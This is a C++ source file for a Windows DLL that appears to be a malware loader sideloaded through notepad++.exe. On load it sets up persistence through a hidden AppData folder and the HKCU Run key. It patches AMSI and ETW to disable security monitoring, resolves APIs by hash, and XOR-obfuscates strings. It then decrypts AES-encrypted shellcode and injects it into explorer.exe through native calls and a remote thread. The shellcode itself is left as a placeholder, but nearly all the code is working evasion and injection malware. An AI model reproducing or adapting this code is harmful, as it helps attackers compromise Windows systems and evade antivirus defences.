#include <shlobj.h>              // For SHGetFolderPathA
#include <tlhelp32.h>            // For CreateToolhelp32Snapshot, PROCESSENTRY32W, THREADENTRY32
#include <fstream>               // For std::ofstream
#include <random>                // For std::random_device, std::mt19937
#include <algorithm>  

#include <windows.h>
#include "AESHandler.h"
#include <filesystem>


#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Crypt32.lib")
namespace fs = std::filesystem;
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = (r);                       \
    (p)->Attributes = (a);                          \
    (p)->ObjectName = (n);                           \
    (p)->SecurityDescriptor = (s);                  \
    (p)->SecurityQualityOfService = NULL;           \
}

// ======= SYSCALL PROTOTYPES =======
#define OPENSSL_API_COMPAT 0x10100000L
#define OPENSSL_NO_DYNAMIC_ENGINE
const unsigned char AES_KEY_PART1[] = { 0x91, 0x79, 0xb0, 0x59, 0xa3, 0xe0, 0x4e, 0x49 };
const unsigned char AES_KEY_PART2[] = { 0xe0, 0x77, 0xd5, 0x12, 0x7e, 0xaf, 0x33, 0xd1 };
const unsigned char AES_IV_PART1[] = { 0xe0, 0x23, 0x8f, 0x42, 0x01, 0x6a, 0xd7, 0x82 };
const unsigned char AES_IV_PART2[] = { 0xa7, 0x46, 0xf0, 0xed, 0x3a, 0xa3, 0xb2, 0x4f };

const char* ENCRYPTED_FOLDER_NAME = "\x15\x23\x30\x01\x37\x26\x2A"; // XOR-encrypted name
const char* ENCRYPTED_TASK_NAME = "\x1A\x3D\x25\x13\x17\x28\x3C";   // XOR-encrypted name
const char XOR_KEY = 0x5A;


std::string generateRandomName(size_t length = 10) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    std::mt19937 gen(GetTickCount());
    std::uniform_int_distribution<> dist(0, sizeof(charset) - 2);
    for (size_t i = 0; i < length; ++i)
        result += charset[dist(gen)];
    return result;
}

std::string getAppDataPath() {
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    return std::string(appData);
}

void copyFileTo(const std::string& src, const std::string& dst) {
    std::ifstream in(src, std::ios::binary);
    std::ofstream out(dst, std::ios::binary);
    out << in.rdbuf();
}

bool ExecuteCommandSilently(const std::string& command) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return true;
    }
    return false;
}
std::string xorEncrypt(const std::string& input, char key) {
    std::string output = input;
    for (char& c : output) c ^= key;
    return output;
}
std::string xorDecrypt(const std::string& input, char key) {
    return xorEncrypt(input, key); // XOR is symmetric
}

void setupPersistence() {
    const char xorKey = 0x5A;
    std::string appData = getAppDataPath();
    std::string configPath = appData + "\\config.dat";

    std::string folderName, regValueName, regValueNameEnc;

    if (fs::exists(configPath)) {
        std::ifstream in(configPath);
        std::getline(in, folderName);
        std::getline(in, regValueNameEnc);
        in.close();
        regValueName = xorDecrypt(regValueNameEnc, xorKey);
    }
    else {
        folderName = generateRandomName();
        regValueName = generateRandomName();
        regValueNameEnc = xorEncrypt(regValueName, xorKey);
        std::ofstream out(configPath);
        out << folderName << "\n" << regValueNameEnc << "\n";
        out.close();
    }

    std::string fullPath = appData + "\\" + folderName;
    if (!fs::exists(fullPath)) {
        fs::create_directory(fullPath);
        copyFileTo("notepad++.exe", fullPath + "\\notepad++.exe");
        copyFileTo("SciLexer.dll", fullPath + "\\SciLexer.dll");
        copyFileTo("libcrypto-3-x64.dll", fullPath + "\\libcrypto-3-x64.dll");
        copyFileTo("libgcc_s_seh-1.dll", fullPath + "\\libgcc_s_seh-1.dll");
        copyFileTo("libstdc++-6.dll", fullPath + "\\libstdc++-6.dll");
        copyFileTo("libwinpthread-1.dll", fullPath + "\\libwinpthread-1.dll");
    }

    // Add to Registry Run key with decrypted name
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
    {
        std::string exePath = fullPath + "\\notepad++.exe";
        RegSetValueExA(hKey, regValueName.c_str(), 0, REG_SZ,
            (const BYTE*)exePath.c_str(), (DWORD)(exePath.size() + 1));
        RegCloseKey(hKey);
    }
}





std::string decryptXor(const char* data, size_t len, char key) {
    std::string result;
    for (size_t i = 0; i < len; ++i)
        result.push_back(data[i] ^ key);
    return result;
}
std::string GetStealthFolderPath() {
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
    std::string folder = decryptXor(ENCRYPTED_FOLDER_NAME, 7, XOR_KEY);
    std::string path = std::string(appData) + "\\" + folder;
    CreateDirectoryA(path.c_str(), NULL);
    return path;
}

void EnsureStealthTask(const std::string& exePath) {
    std::string taskName = decryptXor(ENCRYPTED_TASK_NAME, 7, XOR_KEY);
    std::string cmd = "schtasks /Create /TN " + taskName + " /TR \"" + exePath + "\" /SC ONLOGON /RL LIMITED /F";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
}


#pragma comment(lib, "ntdll.lib") // Tell linker to search ntdll.lib
NTSTATUS NtAlertResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
) {
    using func_t = decltype(&NtAlertResumeThread);
    static func_t f = (func_t)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAlertResumeThread");
    return f(ThreadHandle, PreviousSuspendCount);
}

extern "C" {
    NTSTATUS NtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    ) {
        return ((decltype(&NtOpenProcess))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess"))(
            ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
    }

    NTSTATUS NtAllocateVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        ULONG_PTR ZeroBits,
        PSIZE_T RegionSize,
        ULONG AllocationType,
        ULONG Protect
    ) {
        return ((decltype(&NtAllocateVirtualMemory))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory"))(
            ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
    }

    NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T BufferLength,
        PSIZE_T BytesWritten
    ) {
        return ((decltype(&NtWriteVirtualMemory))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory"))(
            ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten);
    }

    NTSTATUS NtProtectVirtualMemory(
        HANDLE ProcessHandle,
        PVOID* BaseAddress,
        PSIZE_T RegionSize,
        ULONG NewProtect,
        PULONG OldProtect
    ) {
        return ((decltype(&NtProtectVirtualMemory))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory"))(
            ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
    }

    NTSTATUS NtCreateThreadEx(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        HANDLE ProcessHandle,
        PVOID StartRoutine,
        PVOID Argument,
        ULONG CreateFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        PVOID AttributeList
    ) {
        return ((decltype(&NtCreateThreadEx))GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx"))(
            ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument,
            CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
    }
}
// Patch ETW
std::string decryptXor(const std::string& data, char key) {
    std::string result = data;
    for (char& c : result) c ^= key;
    return result;
}

FARPROC getFuncByHash(HMODULE module, DWORD hash) {
    BYTE* base = reinterpret_cast<BYTE*>(module);
    IMAGE_DOS_HEADER* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    IMAGE_NT_HEADERS* nt = reinterpret_cast<IMAGE_NT_HEADERS*>(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* names = reinterpret_cast<DWORD*>(base + exp->AddressOfNames);
    WORD* ordinals = reinterpret_cast<WORD*>(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = reinterpret_cast<DWORD*>(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* funcName = reinterpret_cast<const char*>(base + names[i]);
        DWORD h = 0;
        for (int j = 0; funcName[j] != 0; ++j)
            h = ((h << 5) + h) + funcName[j];
        if (h == hash) return reinterpret_cast<FARPROC>(base + funcs[ordinals[i]]);
    }
    return nullptr;
}

// Example usage: hash("AmsiScanBuffer") = 0x73e2d87e


void PatchAMSI() {
    char xorKey = 0x5A;
    const char encAmsiDll[] = { 0x3b, 0x37, 0x2f, 0x32, 0x31, 0x38, 0x3a, 0x3a, 0x19, 0x15, 0x12, 0x12 };
    std::string amsiDllName = decryptXor(encAmsiDll, sizeof(encAmsiDll), xorKey);

    HMODULE hAmsi = LoadLibraryA(amsiDllName.c_str());
    if (!hAmsi) return;

    FARPROC target = getFuncByHash(hAmsi, 0x73e2d87e); // AmsiScanBuffer
    if (target) {
        DWORD oldProtect;
        BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
        VirtualProtect((LPVOID)target, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy((void*)target, patch, sizeof(patch));
        VirtualProtect((LPVOID)target, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), (LPCVOID)target, sizeof(patch));
    }
}

void PatchETW() {
    FARPROC target = getFuncByHash(GetModuleHandleA("ntdll.dll"), 0xe5c34ed8); // EtwEventWrite
    if (target) {
        DWORD oldProtect;
        BYTE patch[] = { 0xC3 }; // ret
        VirtualProtect((LPVOID)target, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
        memcpy((void*)target, patch, sizeof(patch));
        VirtualProtect((LPVOID)target, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), (LPCVOID)target, sizeof(patch));
    }
}

// Log errors to a file (Disabled)
void LogError(const std::string& message) {}

// Execute a command silently


// Get the path to the vlcapp folder in AppData


// Check if a folder exists
bool FolderExists(const std::string& folderPath) {
    DWORD attribs = GetFileAttributesA(folderPath.c_str());
    return (attribs != INVALID_FILE_ATTRIBUTES && (attribs & FILE_ATTRIBUTE_DIRECTORY));
}

// Copy a file to the vlcapp folder
void KillProcessByName(const std::wstring& processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32W entry = { 0 };
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, entry.th32ProcessID);
                if (hProcess) {
                    TerminateProcess(hProcess, 0);
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
}

void AutoReEncryptShellcode(const std::string& path, const std::vector<unsigned char>& decryptedShellcode) {
    std::vector<unsigned char> newKey(16);
    std::vector<unsigned char> newIV(16);
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);

    for (int i = 0; i < 16; ++i) {
        newKey[i] = static_cast<unsigned char>(dist(gen));
        newIV[i] = static_cast<unsigned char>(dist(gen));
    }

    AESHandler newHandler(newKey, newIV);
    std::vector<unsigned char> newEncrypted = newHandler.Encrypt(decryptedShellcode);

    std::ofstream out(path, std::ios::binary | std::ios::trunc);
    out.write(reinterpret_cast<char*>(newKey.data()), newKey.size());
    out.write(reinterpret_cast<char*>(newIV.data()), newIV.size());
    out.write(reinterpret_cast<char*>(newEncrypted.data()), newEncrypted.size());
    out.close();
}

// Create the vlcapp folder and copy required files


// Create a Task Scheduler entry


// Get the PID of explorer.exe
DWORD GetTargetPID() {
    DWORD targetPID = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W processEntry = { 0 };
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &processEntry)) {
        do {
            if (_wcsicmp(processEntry.szExeFile, L"explorer.exe") == 0) {
                targetPID = processEntry.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &processEntry));
    }
    CloseHandle(hSnapshot);

    // If RuntimeBroker.exe is not found, fallback to explorer.exe
    if (targetPID == 0) {
        HANDLE hSnapshot2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot2 == INVALID_HANDLE_VALUE) return 0;

        PROCESSENTRY32W processEntry2 = { 0 };
        processEntry2.dwSize = sizeof(PROCESSENTRY32W);


        if (Process32FirstW(hSnapshot2, &processEntry2)) {
            do {
                if (_wcsicmp(processEntry2.szExeFile, L"explorer.exe") == 0) {
                    targetPID = processEntry2.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot2, &processEntry2));
        }
        CloseHandle(hSnapshot2);
    }

    return targetPID;
}

// Inject the decrypted shellcode into the target process
void inject(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = NULL;
    CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
    OBJECT_ATTRIBUTES objAttr = { 0 };
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    if (NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId) != 0 || !hProcess) return;

    SIZE_T shellcodeSize = shellcode.size();
    PVOID allocAddress = NULL;
    if (NtAllocateVirtualMemory(hProcess, &allocAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        CloseHandle(hProcess);
        return;
    }

    if (NtWriteVirtualMemory(hProcess, allocAddress, (PVOID)shellcode.data(), shellcodeSize, NULL) != 0) {
        CloseHandle(hProcess);
        return;
    }

    ULONG oldProtect = 0;
    if (NtProtectVirtualMemory(hProcess, &allocAddress, &shellcodeSize, PAGE_EXECUTE_READ, &oldProtect) != 0) {
        CloseHandle(hProcess);
        return;
    }

    // Find a thread in the target process
    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return;
    }

    THREADENTRY32 te32 = { 0 };
    te32.dwSize = sizeof(THREADENTRY32);
    DWORD threadId = 0;

    if (Thread32First(hThreadSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == pid) {
                threadId = te32.th32ThreadID;
                break;
            }
        } while (Thread32Next(hThreadSnap, &te32));
    }
    CloseHandle(hThreadSnap);

    if (threadId == 0) {
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION, FALSE, threadId);
    if (!hThread) {
        CloseHandle(hProcess);
        return;
    }

    // Queue shellcode in APC and trigger it
    HANDLE hThreadRemote = NULL;
    NtCreateThreadEx(&hThreadRemote, THREAD_ALL_ACCESS, NULL, hProcess, allocAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (hThreadRemote) {
        CloseHandle(hThreadRemote);
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);

    // Clean shellcode from memory
    SecureZeroMemory((void*)shellcode.data(), shellcode.size());
}


// Exported function for shellcode injection
extern "C" __declspec(dllexport) void InjectShellcode() {
    static bool shellcodeInjected = false;
    if (shellcodeInjected) return;


    setupPersistence();
    PatchETW();
    PatchAMSI();
   
    DWORD pid = GetTargetPID();
    if (pid == 0) return;




    std::vector<unsigned char> key = /* the 16 byte aes key here */
        std::vector<unsigned char> iv = /* the 16 byte aes IV here */
        std::vector<unsigned char> encryptedShellcode =  /* encrypted shellcode byte here*/



    AESHandler aesHandler(key, iv);
    std::vector<unsigned char> decryptedShellcode = aesHandler.Decrypt(encryptedShellcode);

    inject(pid, decryptedShellcode);

    // Secure wipe decrypted shellcode from RAM
    SecureZeroMemory(decryptedShellcode.data(), decryptedShellcode.size());

    // Secure wipe encrypted shellcode after use (optional for AV evasion)
    std::generate(encryptedShellcode.begin(), encryptedShellcode.end(), []() {
        return static_cast<unsigned char>(rand() % 256);
        });
    SecureZeroMemory(encryptedShellcode.data(), encryptedShellcode.size());

    // Lock loop to persist DLL presence
    shellcodeInjected = true;
    KillProcessByName(L"notepad++.exe");

    while (true) {
        Sleep(1000);
    }
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        InjectShellcode();
    }
    return TRUE;
}
